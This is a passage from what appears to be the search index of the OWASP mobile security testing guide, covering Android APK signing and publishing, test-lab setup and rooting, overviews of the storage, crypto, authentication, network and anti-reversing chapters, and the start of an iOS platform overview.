adds information about the supported SDK versions and a proof-of-rotation struct to the APK signing block. In Android 9 (API level 28) and higher, APKs can be verified according to APK Signature Scheme v3, v2 or v1 scheme. Older platforms ignore v3 signatures and try to verify v2 then v1 signature.</p> <p>The proof-of-rotation attribute in the signed-data of the signing block consists of a singly-linked list, with each node containing a signing certificate used to sign previous versions of the app. To make backward compatibility work, the old signing certificates sign the new set of certificates, thus providing each new key with evidence that it should be as trusted as the older key(s). It is no longer possible to sign APKs independently, because the proof-of-rotation structure must have the old signing certificates signing the new set of certificates, rather than signing them one-by-one. You can see the APK signature v3 scheme verification process below.</p> <p></p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#apk-signature-scheme-v4-scheme","title":"APK Signature Scheme (v4 Scheme)","text":"<p>The APK Signature Scheme v4 was introduced along with Android 11 (API level 30) and requires all devices launched with Android 11 and up to have fs-verity enabled by default. fs-verity is a Linux kernel feature that is primarily used for file authentication (detection of malicious modifications) due to its extremely efficient file hash calculation. Read requests only will succeed if the content verifies against trusted digital certificates that were loaded to the kernel keyring during boot time.</p> <p>The v4 signature requires a complementary v2 or v3 signature and in contrast to previous signature schemes, the v4 signature is stored in a separate file <code>&lt;apk name&gt;.apk.idsig</code>. Remember to specify it using the <code>--v4-signature-file</code> flag when verifying a v4-signed APK with <code>apksigner verify</code>.</p> <p>You can find more detailed information in the Android developer documentation.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#creating-your-certificate","title":"Creating Your Certificate","text":"<p>Android uses public/private certificates to sign Android apps (.apk files). Certificates are bundles of information; in terms of security, keys are the most important part of that bundle. Public certificates contain users' public keys, and private certificates contain users' private keys. Public and private certificates are linked. Certificates are unique and can't be re-generated. Note that if a certificate is lost, it cannot be recovered, so updating any apps signed with that certificate becomes impossible. App creators can either reuse an existing private/public key pair that is in an available KeyStore or generate a new pair. In the Android SDK, a new key pair is generated with the <code>keytool</code> command. The following command creates a RSA key pair with a key length of 2048 bits and an expiry time of 7300 days = 20 years. The generated key pair is stored in the file 'myKeyStore.jks', which is in the current directory:</p> <pre><code>keytool -genkey -alias myDomain -keyalg RSA -keysize 2048 -validity 7300 -keystore myKeyStore.jks -storepass myStrongPassword\n</code></pre> <p>Safely storing your secret key and making sure it remains secret during its entire life cycle is of paramount importance. Anyone who gains access to the key will be able to publish updates to your apps with content that you don't control (thereby adding insecure features or accessing shared content with signature-based permissions). The trust that a user places in an app and its developers is based totally on such certificates; certificate protection and secure management are therefore vital for reputation and customer retention, and secret keys must never be shared with other individuals. Keys are stored in a binary file that can be protected with a password; such files are referred to as KeyStores. KeyStore passwords should be strong and known only to the key creator. For this reason, keys are usually stored on a dedicated build machine that developers have limited access to. An Android certificate must have a validity period that's longer than that of the associated app (including updated versions of the app). For example, Google Play will require certificates to remain valid until Oct 22nd, 2033 at least.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#signing-an-application","title":"Signing an Application","text":"<p>The goal of the signing process is to associate the app file (.apk) with the developer's public key. To achieve this, the developer calculates a hash of the APK file and encrypts it with their own private key. Third parties can then verify the app's authenticity (e.g., the fact that the app really comes from the user who claims to be the originator) by decrypting the encrypted hash with the author's public key and verifying that it matches the actual hash of the APK file.</p> <p>Many Integrated Development Environments (IDE) integrate the app signing process to make it easier for the user. Be aware that some IDEs store private keys in clear text in configuration files; double-check this in case others are able to access such files and remove the information if necessary. Apps can be signed from the command line with the 'apksigner' tool provided by the Android SDK (API level 24 and higher). It is located at <code>[SDK-Path]/build-tools/[version]</code>. For API 24.0.2 and below, you can use 'jarsigner', which is part of the Java JDK. Details about the whole process can be found in official Android documentation; however, an example is given below to illustrate the point.</p> <pre><code>apksigner sign --out mySignedApp.apk --ks myKeyStore.jks myUnsignedApp.apk\n</code></pre> <p>In this example, an unsigned app ('myUnsignedApp.apk') will be signed with a private key from the developer KeyStore 'myKeyStore.jks' (located in the current directory). The app will become a signed app called 'mySignedApp.apk' and will be ready to release to stores.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#zipalign","title":"Zipalign","text":"<p>The <code>zipalign</code> tool should always be used to align the APK file before distribution. This tool aligns all uncompressed data (such as images, raw files, and 4-byte boundaries) within the APK, which helps improve memory management during app runtime.</p> <p>Zipalign must be used before the APK file is signed with apksigner.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#publishing-process","title":"Publishing Process","text":"<p>Distributing apps from anywhere (your own site, any store, etc.) is possible because the Android ecosystem is open. However, Google Play is the most well-known, trusted, and popular store, and Google itself provides it. Amazon Appstore is the trusted default store for Kindle devices. If users want to install third-party apps from a non-trusted source, they must explicitly allow this with their device security settings.</p> <p>Apps can be installed on an Android device from a variety of sources: locally via USB, via Google's official app store (Google Play Store) or from alternative stores.</p> <p>Whereas other vendors may review and approve apps before they are actually published, Google will simply scan for known malware signatures; this minimizes the time between the beginning of the publishing process and public app availability.</p> <p>Publishing an app is quite straightforward; the main operation is making the signed APK file downloadable. On Google Play, publishing starts with account creation and is followed by app delivery through a dedicated interface. Details are available at the official Android documentation.</p>","tags":[]},{"location":"MASTG/0x05b-Android-Security-Testing/","title":"Android Security Testing","text":"<p>In this chapter, we'll dive into setting up a security testing environment and introduce you to some practical processes and techniques for testing the security of Android apps. These are the building blocks for the MASTG test cases.</p>","tags":[]},{"location":"MASTG/0x05b-Android-Security-Testing/#android-testing-setup","title":"Android Testing Setup","text":"<p>You can set up a fully functioning test environment on almost any machine running Windows, Linux, or macOS.</p>","tags":[]},{"location":"MASTG/0x05b-Android-Security-Testing/#host-device","title":"Host Device","text":"<p>At the very least, you'll need  Android Studio (which comes with the  Android SDK) platform tools, an emulator, and an app to manage the various SDK versions and framework components. Android Studio also comes with an Android Virtual Device (AVD) Manager application for creating emulator images. Make sure that the newest SDK tools and platform tools packages are installed on your system.</p> <p>In addition, you may want to complete your host setup by installing the  Android NDK if you're planning to work with apps containing native libraries.</p> <p>Sometimes it can be useful to display or control devices from the computer. To achieve this, you can use  Scrcpy.</p>","tags":[]},{"location":"MASTG/0x05b-Android-Security-Testing/#testing-device","title":"Testing Device","text":"<p>For dynamic analysis, you'll need an Android device to run the target app on. In principle, you can test without a real Android device and use only the emulator. However, apps execute quite slowly on a emulator, and simulators may not give realistic results. Testing on a real device makes for a smoother process and a more realistic environment. On the other hand, emulators allow you to easily change SDK versions or create multiple devices. A full overview of the pros and cons of each approach is listed in the table below.</p> Property Physical Emulator/Simulator Ability to restore Softbricks are always possible, but new firmware can typically still be flashed. Hardbricks are very rare. Emulators can crash or become corrupt, but a new one can be created or a snapshot can be restored. Reset Can be restored to factory settings or reflashed. Emulators can be deleted and recreated. Snapshots Not possible. Supported, great for malware analysis. Speed Much faster than emulators. Typically slow, but improvements are being made. Cost Typically start at $200 for a usable device. You may require different devices, such as one with or without a biometric sensor. Both free and commercial solutions exist. Ease of rooting Highly dependent on the device. Typically rooted by default. Ease of emulator detection It's not an emulator, so emulator checks are not applicable. Many artefacts will exist, making it easy to detect that the app is running in an emulator. Ease of root detection Easier to hide root, as many root detection algorithms check for emulator properties. With Magisk Systemless root it's nearly impossible to detect. Emulators will almost always trigger root detection algorithms due to the fact that they are built for testing with many artefacts that can be found. Hardware interaction Easy interaction through Bluetooth, NFC, 4G, Wi-Fi, biometrics, camera, GPS, gyroscope, ... Usually fairly limited, with emulated hardware input (e.g. random GPS coordinates) API level support Depends on the device and the community. Active communities will keep distributing updated versions (e.g. LineageOS), while less popular devices may only receive a few updates. Switching between versions requires flashing the device, a tedious process. Always supports the latest versions, including beta releases. Emulators containing specific API levels can easily be downloaded and launched. Native library support Native libraries are usually built for ARM devices, so they will work on a physical device. Some emulators run on x86 CPUs, so they may not be able to run packaged native libraries. Malware danger Malware samples can infect a device, but if you can clear out the device storage and flash a clean firmware, thereby restoring it to factory settings, this should not be a problem. Be aware that there are malware samples that try to exploit the USB bridge. Malware samples can infect an emulator, but the emulator can simply be removed and recreated. It is also possible to create snapshots and compare different snapshots to help in malware analysis. Be aware that there are malware proofs of concept which try to attack the hypervisor.","tags":[]},{"location":"MASTG/0x05b-Android-Security-Testing/#testing-on-a-real-device","title":"Testing on a Real Device","text":"<p>Almost any physical device can be used for testing, but there are a few considerations to be made. First, the device needs to be rootable. This is typically either done through an exploit, or through an unlocked bootloader. Exploits are not always available, and the bootloader may be locked permanently, or it may only be unlocked once the carrier contract has been terminated.</p> <p>The best candidates are flagship Google pixel devices built for developers. These devices typically come with an unlockable bootloader, opensource firmware, kernel, radio available online and official OS source code. The developer communities prefer Google devices as the OS is closest to the android open source project. These devices generally have the longest support windows with 2 years of OS updates and 1 year of security updates after that.</p> <p>Alternatively, Google's Android One project contains devices that will receive the same support windows (2 years of OS updates, 1 year of security updates) and have near-stock experiences. While it was originally started as a project for low-end devices, the program has evolved to include mid-range and high-end smartphones, many of which are actively supported by the modding community.</p> <p>Devices that are supported by the LineageOS project are also very good candidates for test devices. They have an active community, easy to follow flashing and rooting instructions and the latest Android versions are typically quickly available as a Lineage installation. LineageOS also continues support for new Android versions long after the OEM has stopped distributing updates.</p> <p>When working with an Android physical device, you'll want to enable Developer Mode and USB debugging on the device in order to use the  adb debugging interface. Since Android 4.2 (API level 16), the Developer options sub menu in the Settings app is hidden by default. To activate it, tap the Build number section of the About phone view seven times. Note that the build number field's location varies slightly by device. For example, on LG Phones, it is under About phone -&gt; Software information. Once you have done this, Developer options will be shown at bottom of the Settings menu. Once developer options are activated, you can enable debugging with the USB debugging switch.</p>","tags":[]},{"location":"MASTG/0x05b-Android-Security-Testing/#testing-on-an-emulator","title":"Testing on an Emulator","text":"<p>Multiple emulators exist, once again with their own strengths and weaknesses:</p> <p>Free emulators:</p> <ul> <li>Android Virtual Device (AVD) - The official android emulator, distributed with Android Studio.</li> <li>Android X86 - An x86 port of the Android code base</li> </ul> <p>Commercial emulators:</p> <ul> <li>Genymotion - Mature emulator with many features, both as local and cloud-based solution. Free version available for non-commercial use.</li> <li>Corellium - Offers custom device virtualization through a cloud-based or on-prem solution.</li> </ul> <p>Although there exist several free Android emulators, we recommend using AVD as it provides enhanced features appropriate for testing your app compared to the others. In the remainder of this guide, we will use the official AVD to perform tests.</p> <p>AVD supports some hardware emulation, such as GPS or SMS through its so-called Extended Controls as well as motion sensors.</p> <p>You can either start an Android Virtual Device (AVD) by using the AVD Manager in Android Studio or start the AVD manager from the command line with the <code>android</code> command, which is found in the tools directory of the Android SDK:</p> <pre><code>./android avd\n</code></pre> <p>Several tools and VMs that can be used to test an app within an emulator environment are available:</p> <ul> <li> MobSF</li> <li>Nathan (not updated since 2016)</li> </ul>","tags":[]},{"location":"MASTG/0x05b-Android-Security-Testing/#getting-privileged-access","title":"Getting Privileged Access","text":"<p>Rooting (i.e., modifying the OS so that you can run commands as the root user) is recommended for testing on a real device. This gives you full control over the operating system and allows you to bypass restrictions such as app sandboxing. These privileges in turn allow you to use techniques like code injection and function hooking more easily.</p> <p>Note that rooting is risky, and three main consequences need to be clarified before you proceed. Rooting can have the following negative effects:</p> <ul> <li>voiding the device warranty (always check the manufacturer's policy before taking any action)</li> <li>\"bricking\" the device, i.e., rendering it inoperable and unusable</li> <li>creating additional security risks (because built-in exploit mitigations are often removed)</li> </ul> <p>You should not root a personal device that you store your private information on. We recommend getting a cheap, dedicated test device instead. Many older devices, such as Google's Nexus series, can run the newest Android versions and are perfectly fine for testing.</p> <p>You need to understand that rooting your device is ultimately YOUR decision and that OWASP shall in no way be held responsible for any damage. If you're uncertain, seek expert advice before starting the rooting process.</p>","tags":[]},{"location":"MASTG/0x05b-Android-Security-Testing/#which-mobiles-can-be-rooted","title":"Which Mobiles Can Be Rooted","text":"<p>Virtually any Android mobile can be rooted. Commercial versions of Android OS (which are Linux OS evolutions at the kernel level) are optimized for the mobile world. Some features have been removed or disabled for these versions, for example, non-privileged users' ability to become the 'root' user (who has elevated privileges). Rooting a phone means allowing users to become the root user, e.g., adding a standard Linux executable called <code>su</code>, which is used to change to another user account.</p> <p>To root a mobile device, first unlock its boot loader. The unlocking procedure depends on the device manufacturer. However, for practical reasons, rooting some mobile devices is more popular than rooting others, particularly when it comes to security testing: devices created by Google and manufactured by companies like Samsung, LG, and Motorola are among the most popular, particularly because they are used by many developers. The device warranty is not nullified when the boot loader is unlocked and Google provides many tools to support the root itself.</p>","tags":[]},{"location":"MASTG/0x05b-Android-Security-Testing/#rooting-with-magisk","title":"Rooting with Magisk","text":"<p>Magisk (\"Magic Mask\") is one way to root your Android device. Its specialty lies in the way the modifications on the system are performed. While other rooting tools alter the actual data on the system partition, Magisk does not (which is called \"systemless\"). This enables a way to hide the modifications from root-sensitive applications (e.g. for banking or games) and allows using the official Android OTA upgrades without the need to unroot the device beforehand.</p> <p>You can get familiar with Magisk reading the official documentation on GitHub. If you don't have Magisk installed, you can find installation instructions in the documentation. If you use an official Android version and plan to upgrade it, Magisk provides a tutorial on GitHub.</p> <p>Furthermore, developers can use the power of Magisk to create custom modules and submit them to the official Magisk Modules repository. Submitted modules can then be installed inside the Magisk Manager application. One of these installable modules is a systemless version of  Xposed (available for SDK versions up to 27).</p>","tags":[]},{"location":"MASTG/0x05b-Android-Security-Testing/#root-detection","title":"Root Detection","text":"<p>An extensive list of root detection methods is presented in the \"Testing Anti-Reversing Defenses on Android\" chapter.</p> <p>For a typical mobile app security build, you'll usually want to test a debug build with root detection disabled. If such a build is not available for testing, you can disable root detection in a variety of ways that will be introduced later in this book.</p>","tags":[]},{"location":"MASTG/0x05d-Testing-Data-Storage/","title":"Android Data Storage","text":"","tags":["android","MASVS-STORAGE"]},{"location":"MASTG/0x05d-Testing-Data-Storage/#overview","title":"Overview","text":"<p>This chapter discusses the importance of securing sensitive data, like authentication tokens and private information, vital for mobile security. We'll look at Android's APIs for local data storage and share best practices.</p> <p>While it's preferable to limit sensitive data on local storage, or avoid it at all whenever possible, practical use cases often necessitate user data storage. For example, to improve user experience, apps cache authentication tokens locally, circumventing the need for complex password entry at each app start. Apps may also need to store personally identifiable information (PII) and other sensitive data.</p> <p>Sensitive data can become vulnerable if improperly protected, potentially stored in various locations, including the device or an external SD card. It's important to identify the information processed by the mobile app and classify what counts as sensitive data. Check out the \"Identifying Sensitive Data\" section in the \"Mobile App Security Testing\" chapter for data classification details. Refer to Security Tips for Storing Data in the Android developer's guide for comprehensive insights.</p> <p>Sensitive information disclosure risks include potential information decryption, social engineering attacks (if PII is disclosed), account hijacking (if session information or an authentication token is disclosed), and app exploitation with a payment option.</p> <p>In addition to data protection, validate and sanitize data from any storage source. This includes checking correct data types and implementing cryptographic controls, such as HMACs, for data integrity.</p> <p>Android offers various data storage methods, tailored to users, developers, and applications. Common persistent storage techniques include:</p> <ul> <li>Shared Preferences</li> <li>SQLite Databases</li> <li>Firebase Databases</li> <li>Realm Databases</li> <li>Internal Storage</li> <li>External Storage</li> <li>Keystore</li> </ul> <p>Additionally, other Android functions that can result in data storage and should be tested include:</p> <ul> <li>Logging Functions</li> <li>Android Backups</li> <li>Processes Memory</li> <li>Keyboard Caches</li> <li>Screenshots</li> </ul> <p>Understanding each relevant data storage function is crucial for performing the appropriate test cases. This overview provides a brief outline of these data storage methods and points testers to further relevant documentation.</p> <p></p>","tags":["android","MASVS-STORAGE"]},{"location":"MASTG/0x05d-Testing-Data-Storage/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0026  Third-party Services Embedded in the App platform:android MASTG-KNOW-0051  Process Memory platform:android MASTG-KNOW-0049  Logs platform:android MASTG-KNOW-0053  Screenshots platform:android MASTG-KNOW-0039  Firebase Real-time Databases platform:android MASTG-KNOW-0055  Keyboard Cache platform:android MASTG-KNOW-0047  Cryptographic Key Storage platform:android MASTG-KNOW-0036  Shared Preferences platform:android MASTG-KNOW-0041  Internal Storage platform:android MASTG-KNOW-0046  BouncyCastle KeyStore platform:android MASTG-KNOW-0037  SQLite Database platform:android MASTG-KNOW-0044  Key Attestation platform:android MASTG-KNOW-0050  Backups platform:android MASTG-KNOW-0040  Realm Databases platform:android MASTG-KNOW-0045  Secure Key Import into Keystore platform:android MASTG-KNOW-0042  External Storage platform:android MASTG-KNOW-0048  KeyChain platform:android MASTG-KNOW-0043  Android KeyStore platform:android MASTG-KNOW-0038  SQLCipher Database platform:android MASTG-KNOW-0052  User Interface Components platform:android MASTG-KNOW-0054  App Notifications platform:android","tags":["android","MASVS-STORAGE"]},{"location":"MASTG/0x05e-Testing-Cryptography/","title":"Android Cryptographic APIs","text":"","tags":["android","MASVS-CRYPTO"]},{"location":"MASTG/0x05e-Testing-Cryptography/#overview","title":"Overview","text":"<p>In the chapter \"Mobile App Cryptography\", we introduced general cryptography best practices and described typical issues that can occur when cryptography is used incorrectly. In this chapter, we'll go into more detail on Android's cryptography APIs. We'll show how to identify usage of those APIs in the source code and how to interpret cryptographic configurations. When reviewing code, make sure to compare the cryptographic parameters used with the current best practices, as linked in this guide.</p> <p>We can identify key components of cryptography system on Android:</p> <ul> <li> Security Provider</li> <li> Android KeyStore</li> <li> KeyChain</li> </ul> <p>Android cryptography APIs are based on the Java Cryptography Architecture (JCA). JCA separates the interfaces and implementation, making it possible to include several security providers that can implement sets of cryptographic algorithms. Most of the JCA interfaces and classes are defined in the <code>java.security.*</code> and <code>javax.crypto.*</code> packages. In addition, there are Android specific packages <code>android.security.*</code> and <code>android.security.keystore.*</code>.</p> <p>KeyStore and KeyChain provide APIs for storing and using keys (behind the scene, KeyChain API uses KeyStore system). These systems allow to administer the full lifecycle of the cryptographic keys. Requirements and guidance for implementation of cryptographic key management can be found in Key Management Cheat Sheet. We can identify following phases:</p> <ul> <li>generating a key</li> <li>using a key</li> <li>storing a key</li> <li>archiving a key</li> <li>deleting a key</li> </ul> <p>Please note that storing of a key is analyzed in the chapter \"Testing Data Storage\".</p> <p>These phases are managed by the Keystore/KeyChain system. However how the system works depends on how the application developer implemented it. For the analysis process you should focus on functions which are used by the application developer. You should identify and verify the following functions:</p> <ul> <li> Key Generation</li> <li> Random number generation</li> <li>Key rotation</li> </ul> <p>Apps that target modern API levels, went through the following changes:</p> <ul> <li>For Android 7.0 (API level 24) and above the Android Developer blog shows that:<ul> <li>It is recommended to stop specifying a security provider. Instead, always use a patched  Security Provider.</li> <li>The support for the <code>Crypto</code> provider has dropped and the provider is deprecated. The same applies to its <code>SHA1PRNG</code> for secure random.</li> </ul> </li> <li>For Android 8.1 (API level 27) and above the Developer Documentation shows that:<ul> <li>Conscrypt, known as <code>AndroidOpenSSL</code>, is preferred above using Bouncy Castle and it has new implementations: <code>AlgorithmParameters:GCM</code> , <code>KeyGenerator:AES</code>, <code>KeyGenerator:DESEDE</code>, <code>KeyGenerator:HMACMD5</code>, <code>KeyGenerator:HMACSHA1</code>, <code>KeyGenerator:HMACSHA224</code>, <code>KeyGenerator:HMACSHA256</code>, <code>KeyGenerator:HMACSHA384</code>, <code>KeyGenerator:HMACSHA512</code>, <code>SecretKeyFactory:DESEDE</code>, and <code>Signature:NONEWITHECDSA</code>.</li> <li>You should not use the <code>IvParameterSpec.class</code> anymore for GCM, but use the <code>GCMParameterSpec.class</code> instead.</li> <li>Sockets have changed from <code>OpenSSLSocketImpl</code> to <code>ConscryptFileDescriptorSocket</code>, and <code>ConscryptEngineSocket</code>.</li> <li><code>SSLSession</code> with null parameters give a <code>NullPointerException</code>.</li> <li>You need to have large enough arrays as input bytes for generating a key otherwise, an <code>InvalidKeySpecException</code> is thrown.</li> <li>If a Socket read is interrupted, you get a <code>SocketException</code>.</li> </ul> </li> <li>For Android 9 (API level 28) and above the Android Developer Blog shows even more changes:<ul> <li>You get a warning if you still specify a security provider using the <code>getInstance</code> method and you target any API below 28. If you target Android 9 (API level 28) or above, you get an error.</li> <li>The <code>Crypto</code> security provider is now removed. Calling it will result in a <code>NoSuchProviderException</code>.</li> </ul> </li> <li>For Android 10 (API level 29) the Developer Documentation lists all network security changes.</li> </ul> <p>General Recommendations:</p> <p>The following list of recommendations should be considered during app examination:</p> <ul> <li>You should ensure that the best practices outlined in the \"Cryptography for Mobile Apps\" chapter are followed.</li> <li>You should ensure that security provider has the latest updates - Updating security provider.</li> <li>You should stop specifying a security provider and use the default implementation (AndroidOpenSSL, Conscrypt).</li> <li>You should stop using Crypto security provider and its <code>SHA1PRNG</code> as they are deprecated.</li> <li>You should specify a security provider only for the Android Keystore system.</li> <li>You should stop using Password-based encryption ciphers without IV.</li> <li>You should use KeyGenParameterSpec instead of KeyPairGeneratorSpec.</li> </ul> <p></p>","tags":["android","MASVS-CRYPTO"]},{"location":"MASTG/0x05e-Testing-Cryptography/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0013  Random number generation platform:android MASTG-KNOW-0012  Key Generation platform:android MASTG-KNOW-0011  Security Provider platform:android","tags":["android","MASVS-CRYPTO"]},{"location":"MASTG/0x05f-Testing-Local-Authentication/","title":"Android Local Authentication","text":"","tags":["android","MASVS-AUTH"]},{"location":"MASTG/0x05f-Testing-Local-Authentication/#overview","title":"Overview","text":"<p>During local authentication, an app authenticates the user against credentials stored locally on the device. In other words, the user \"unlocks\" the app or some inner layer of functionality by providing a valid PIN, password or biometric characteristics such as face or fingerprint, which is verified by referencing local data. Generally, this is done so that users can more conveniently resume an existing session with a remote service or as a means of step-up authentication to protect some critical function.</p> <p>As stated before in chapter \"Mobile App Authentication Architectures\": The tester should be aware that local authentication should always be enforced at a remote endpoint or based on a cryptographic primitive. Attackers can easily bypass local authentication if no data returns from the authentication process.</p> <p>On Android, there are two mechanisms supported by the Android Runtime for local authentication: the Confirm Credential flow and the Biometric Authentication flow.</p> <p></p>","tags":["android","MASVS-AUTH"]},{"location":"MASTG/0x05f-Testing-Local-Authentication/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0002  FingerprintManager platform:android MASTG-KNOW-0001  Biometric Authentication platform:android","tags":["android","MASVS-AUTH"]},{"location":"MASTG/0x05g-Testing-Network-Communication/","title":"Android Network Communication","text":"","tags":["android","MASVS-NETWORK"]},{"location":"MASTG/0x05g-Testing-Network-Communication/#overview","title":"Overview","text":"<p>Almost every Android app acts as a client to one or more remote services. As this network communication usually takes place over untrusted networks such as public Wi-Fi, classical network based-attacks become a potential issue.</p> <p>Most modern mobile apps use variants of HTTP-based web services, as these protocols are well-documented and supported.</p> <p></p>","tags":["android","MASVS-NETWORK"]},{"location":"MASTG/0x05g-Testing-Network-Communication/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0016  TBD platform:android MASTG-KNOW-0015  Certificate Pinning platform:android MASTG-KNOW-0014  Android Network Security Configuration platform:android","tags":["android","MASVS-NETWORK"]},{"location":"MASTG/0x05h-Testing-Platform-Interaction/","title":"Android Platform APIs","text":"","tags":["android","MASVS-PLATFORM"]},{"location":"MASTG/0x05h-Testing-Platform-Interaction/#overview","title":"Overview","text":"","tags":["android","MASVS-PLATFORM"]},{"location":"MASTG/0x05h-Testing-Platform-Interaction/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0020  Inter-Process Communication (IPC) Mechanisms platform:android MASTG-KNOW-0019  Deep Links platform:android MASTG-KNOW-0021  Object Serialization platform:android MASTG-KNOW-0017  App Permissions platform:android MASTG-KNOW-0025  Implicit Intents platform:android MASTG-KNOW-0023  Enforced Updating platform:android MASTG-KNOW-0018  WebViews platform:android MASTG-KNOW-0024  Pending Intents platform:android MASTG-KNOW-0022  Overlay Attacks platform:android","tags":["android","MASVS-PLATFORM"]},{"location":"MASTG/0x05i-Testing-Code-Quality-and-Build-Settings/","title":"Android Code Quality and Build Settings","text":"","tags":["android","MASVS-CODE"]},{"location":"MASTG/0x05i-Testing-Code-Quality-and-Build-Settings/#overview","title":"Overview","text":"","tags":["android","MASVS-CODE"]},{"location":"MASTG/0x05i-Testing-Code-Quality-and-Build-Settings/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0003  App Signing platform:android MASTG-KNOW-0007  Debuggable Apps platform:android MASTG-KNOW-0004  Third-Party Libraries platform:android MASTG-KNOW-0009  StrictMode platform:android MASTG-KNOW-0005  Memory Corruption Bugs platform:android MASTG-KNOW-0008  Debugging Symbols platform:android MASTG-KNOW-0010  Exception Handling platform:android MASTG-KNOW-0006  Binary Protection Mechanisms platform:android","tags":["android","MASVS-CODE"]},{"location":"MASTG/0x05j-Testing-Resiliency-Against-Reverse-Engineering/","title":"Android Anti-Reversing Defenses","text":"","tags":["android","MASVS-RESILIENCE"]},{"location":"MASTG/0x05j-Testing-Resiliency-Against-Reverse-Engineering/#overview","title":"Overview","text":"<p>General Disclaimer:</p> <p>The lack of any of these measures does not cause a vulnerability - instead, they are meant to increase the app's resilience against reverse engineering and specific client-side attacks.</p> <p>None of these measures can assure a 100% effectiveness, as the reverse engineer will always have full access to the device and will therefore always win (given enough time and resources)!</p> <p>For example, preventing debugging is virtually impossible. If the app is publicly available, it can be run on an untrusted device that is under full control of the attacker. A very determined attacker will eventually manage to bypass all the app's anti-debugging controls by patching the app binary or by dynamically modifying the app's behavior at runtime with tools such as Frida.</p> <p>You can learn more about principles and technical risks of reverse engineering and code modification in these OWASP documents:</p> <ul> <li>OWASP Architectural Principles That Prevent Code Modification or Reverse Engineering</li> <li>OWASP Technical Risks of Reverse Engineering and Unauthorized Code Modification</li> </ul> <p></p>","tags":["android","MASVS-RESILIENCE"]},{"location":"MASTG/0x05j-Testing-Resiliency-Against-Reverse-Engineering/#knowledge-articles","title":"Knowledge Articles","text":"ID Name Platform MASTG-KNOW-0033  Obfuscation platform:android MASTG-KNOW-0035  Google Play Integrity API platform:android MASTG-KNOW-0030  Detection of Reverse Engineering Tools platform:android MASTG-KNOW-0034  Device Binding platform:android MASTG-KNOW-0032  Runtime Integrity Verification platform:android MASTG-KNOW-0029  File Integrity Checks platform:android MASTG-KNOW-0027  Root Detection platform:android MASTG-KNOW-0031  Emulator Detection platform:android MASTG-KNOW-0028  Anti-Debugging platform:android","tags":["android","MASVS-RESILIENCE"]},{"location":"MASTG/0x06a-Platform-Overview/","title":"iOS Platform Overview","text":"<p>iOS is a mobile operating system that powers Apple mobile devices, including the iPhone, iPad, and iPod Touch. It is also the basis for Apple tvOS, which inherits many functionalities from iOS. This section introduces the iOS platform from an architecture point of view. The following five key areas are discussed:</p> <ol> <li>iOS security architecture</li> <li>iOS application structure</li> <li>Inter-process Communication (IPC)</li> <li>iOS application publishing</li> <li>iOS Application Attack Surface</li> </ol> <p>Like the Apple desktop operating system macOS (formerly OS X), iOS is based on Darwin, an open source Unix operating system developed by Apple. Darwin's kernel is XNU (\"X is Not Unix\"), a hybrid kernel that combines components of the Mach and FreeBSD kernels.</p> <p>However, iOS apps run in a more restricted environment than their desktop counterparts do. iOS apps are isolated from each other at the file system level and are significantly limited in terms of system API access.</p> <p>To protect users from malicious applications, Apple restricts and controls access to the apps that are allowed to run on iOS devices. Apple's App Store is the only official application distribution platform. There developers can offer their apps and consumers can buy, download, and install apps. This distribution style differs from Android, which supports several app stores and sideloading (installing an app on your iOS device without using the official App Store). In iOS, sideloading typically refers to the app installation method via USB, although there are other enterprise iOS app distribution methods that do not use the App Store under the Apple Developer Enterprise Program.</p> <p>In the past, sideloading was possible only with a jailbreak or complicated workarounds. With iOS 9 or higher, it is possible to sideload via Xcode.</p> <p>iOS apps are isolated from each other via Apple's iOS sandbox (historically called Seatbelt), a mandatory access control (MAC) mechanism describing the resources an app can and can't access. Compared to Android's extensive Binder IPC facilities, iOS offers very few IPC (Inter Process Communication) options, minimizing the potential attack surface.</p> <p>Uniform hardware and tight hardware/software integration create another security advantage. Every iOS device offers security features, such as secure boot, hardware-backed Keychain, and file system encryption (referred as data protection in iOS). iOS updates are usually quickly rolled out to a large percentage of users, decreasing the need to support older, unprotected iOS versions.</p> <p>In spite of the numerous strengths of iOS, iOS app developers still need to worry about security. Data protection, Keychain, Touch ID/Face ID authentication, and network security still leave a large margin for errors. In the following chapters, we describe iOS security architecture, explain a basic security testing methodology, and provide reverse engineering how-tos.</p>","tags":[]},{"location":"MASTG/0x06a-Platform-Overview/#ios-security-architecture","title":"iOS Security Architecture","text":"<p>The iOS security architecture, officially documented by Apple in the iOS Security Guide, consists of six core features. This security guide is updated by Apple for each major iOS version:</p> <ul> <li>Hardware Security</li> <li>Secure Boot</li> <li>Code Signing</li> <li>Sandbox</li> <li>Encryption and Data Protection</li> <li>General Exploit Mitigations</li> </ul> <p></p>","tags":[]},{"location":"MASTG/0x06a-Platform-Overview/#hardware-security","title":"Hardware Security","text":"<p>The iOS security architecture makes good use of hardware-based security features that enhance overall performance. Each iOS device comes with two built-in Advanced Encryption Standard (AES) 256-bit keys. The device's unique IDs (UIDs) and a device group IDs (GIDs) are AES 256-bit keys fused (UID) or compiled (GID) into the Application Processor (AP) and Secure Enclave Processor (SEP) during manufacturing. There's no direct way to read these keys with software or debugging interfaces such as JTAG. Encryption and decryption operations are performed by hardware AES crypto-engines that have exclusive access to these keys.</p> <p>The GID is a value shared by all processors in a class of devices used to prevent tampering with firmware files and other cryptographic tasks not directly related to the user's private data. UIDs, which are unique to each device, are used to protect the key hierarchy that's used for device-level file system encryption. Because UIDs aren't recorded during manufacturing, not even Apple can restore the file encryption keys for a particular device.</p> <p>To allow secure deletion of sensitive data on flash memory, iOS devices include a feature called Effaceable Storage. This feature provides direct low-level access to the storage technology, making it possible to securely erase selected blocks.</p>","tags":[]},{"location":"MASTG/0x06a-Platform-Overview/#secure-boot","title":"Secure Boot","text":"<p>When an iOS device is powered on, it reads the initial instructions from the read-only memory known as Boot ROM, which bootstraps the system. The Boot ROM contains immutable code and the Apple Root CA, which is etched into the silicon chip during the fabrication process, thereby creating the root of trust. 